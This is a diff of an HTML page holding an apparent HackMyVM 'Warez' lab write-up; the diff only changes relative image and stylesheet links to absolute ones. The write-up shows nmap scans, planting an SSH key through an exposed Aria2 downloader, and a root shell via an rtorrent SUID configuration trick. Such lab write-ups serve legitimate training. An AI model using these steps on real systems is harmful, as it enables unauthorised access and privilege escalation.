@@ -10,7 +10,7 @@
 <meta name="description" content="Difficulty: Easy 🟢">
 <meta name="author" content="">
 <link rel="canonical" href="https://conper.github.io/writeups/easy/warez/">
-<link crossorigin="anonymous" href="../../../assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="https://conper.github.io/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://conper.github.io/assets/favicon.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://conper.github.io/assets/favicon.ico">
@@ -241,17 +241,17 @@ img:hover {
 </style>
 <p><a href="https://hackmyvm.eu/machines/machine.php?vm=Warez">Machine Link</a></p>
 <p>When the machine starts, it displays its IP address; in this case, it is 192.168.18.190.</p>
-<p><img alt="1" loading="lazy" src="../../../images/writeups/warez/1.png"></p>
+<p><img alt="1" loading="lazy" src="https://conper.github.io/images/writeups/warez/1.png"></p>
 <h6>The victim machine's IP address</h6>
 <p>To begin, we will perform a scan using the <strong>NMAP</strong> tool, which will help us identify open ports on the target machine. First, we will use the following command for a <strong>quick scan</strong> that informs us about the <strong>open ports</strong>. We will scan all ports (<strong>65535</strong>) without depth.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sS -p- --min-rate <span style="color:#ae81ff">4500</span> -n -Pn 192.168.18.190
-</span></span></code></pre></div><p><img alt="2" loading="lazy" src="../../../images/writeups/warez/2.png"></p>
+</span></span></code></pre></div><p><img alt="2" loading="lazy" src="https://conper.github.io/images/writeups/warez/2.png"></p>
 <p>And now, with the <strong>open ports</strong> identified, we will perform a more <strong>detailed scan</strong>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p22,80,6800 -n -Pn 192.168.18.190 -oN target
-</span></span></code></pre></div><p><img alt="3" loading="lazy" src="../../../images/writeups/warez/3.png"></p>
+</span></span></code></pre></div><p><img alt="3" loading="lazy" src="https://conper.github.io/images/writeups/warez/3.png"></p>
 <p>We observe that port 6800 is running <a href="https://github.com/aria2/aria2"><strong>Aria2</strong></a>, which is an <strong>open-source downloader</strong> that supports various protocols such as <strong>HTTP</strong>, <strong>FTP</strong>, <strong>BitTorrent</strong>.</p>
 <p>By accessing <strong>port 80</strong>, we obtain the username <strong>Carolina</strong>.</p>
-<p><img alt="4" loading="lazy" src="../../../images/writeups/warez/4.png"></p>
+<p><img alt="4" loading="lazy" src="https://conper.github.io/images/writeups/warez/4.png"></p>
 <h6>User carolina</h6>
 <p>Next, we notice that by selecting &lsquo;<strong>By URLs</strong>&rsquo; within &lsquo;<strong>Add</strong>&rsquo;, we can <strong>upload files</strong> to any directory. So, I am going to copy my <strong>id_rsa.pub</strong> to a file named <em><strong>authorized_keys</strong></em> and upload it, allowing the victim machine to recognize our machine as authorized, specifically as the user <strong>Carolina</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp id_rsa.pub authorized_keys
@@ -259,29 +259,29 @@ img:hover {
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen
 </span></span></code></pre></div><p>And with <strong>Python</strong>, we start a web server on <strong>port 8080</strong>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8080</span>
-</span></span></code></pre></div><p><img alt="5" loading="lazy" src="../../../images/writeups/warez/5.png"></p>
+</span></span></code></pre></div><p><img alt="5" loading="lazy" src="https://conper.github.io/images/writeups/warez/5.png"></p>
 <p>Now, we put the URL where our file is located and change the destination directory to <em><strong>/home/carolina/.ssh</strong></em>.</p>
-<p><img alt="6" loading="lazy" src="../../../images/writeups/warez/6.png"></p>
+<p><img alt="6" loading="lazy" src="https://conper.github.io/images/writeups/warez/6.png"></p>
 <p>We send it, and now we can access via <strong>port 22</strong> (<strong>SSH</strong>) as the user <strong>carolina</strong>.</p>
-<p><img alt="7" loading="lazy" src="../../../images/writeups/warez/7.png"></p>
+<p><img alt="7" loading="lazy" src="https://conper.github.io/images/writeups/warez/7.png"></p>
 <h6>We are now Carolina</h6>
 <p>Let&rsquo;s check how many users are on the machine. It appears that there are only two users: <strong>carolina</strong> and <strong>root</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep /bin/bash /etc/passwd
-</span></span></code></pre></div><p><img alt="8" loading="lazy" src="../../../images/writeups/warez/8.png"></p>
+</span></span></code></pre></div><p><img alt="8" loading="lazy" src="https://conper.github.io/images/writeups/warez/8.png"></p>
 <h6>User on the machine</h6>
 <p>We get the user flag, and now it’s time to move on to privilege escalation.</p>
 <h2 id="privilege-escalation-to-root">Privilege escalation to Root<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-to-root">#</a></h2>
 <p>We enumerate the <strong>SUID binaries</strong> on the machine, and there is one that we can use to escalate to <strong>root</strong> very easily. The relevant binary is <strong>rtorrent</strong>.</p>
-<p><img alt="9" loading="lazy" src="../../../images/writeups/warez/9.png"></p>
+<p><img alt="9" loading="lazy" src="https://conper.github.io/images/writeups/warez/9.png"></p>
 <p>We search in <a href="https://gtfobins.github.io/"><strong>GTFObins</strong></a>, and it provides a way to escalate to <strong>root</strong> using this <strong>SUID binary</strong> by running the following command:</p>
-<p><img alt="11" loading="lazy" src="../../../images/writeups/warez/11.png"></p>
+<p><img alt="11" loading="lazy" src="https://conper.github.io/images/writeups/warez/11.png"></p>
 <h6>Command for privilege escalation</h6>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;execute = /bin/sh,-p,-c,\&#34;/bin/sh -p &lt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> &gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> 2&gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74">\&#34;&#34;</span> &gt;~/.rtorrent.rc 
 </span></span><span style="display:flex;"><span>/usr/bin/rtorrent
-</span></span></code></pre></div><p><img alt="12" loading="lazy" src="../../../images/writeups/warez/12.png"></p>
+</span></span></code></pre></div><p><img alt="12" loading="lazy" src="https://conper.github.io/images/writeups/warez/12.png"></p>
 <h6>We are root</h6>
 <p>Now that we have <strong>root</strong> access, let’s grab the <strong>root flag</strong> and complete the machine</p>
-<p><img alt="13" loading="lazy" src="../../../images/writeups/warez/13.png"></p>
+<p><img alt="13" loading="lazy" src="https://conper.github.io/images/writeups/warez/13.png"></p>
 
 
   </div>
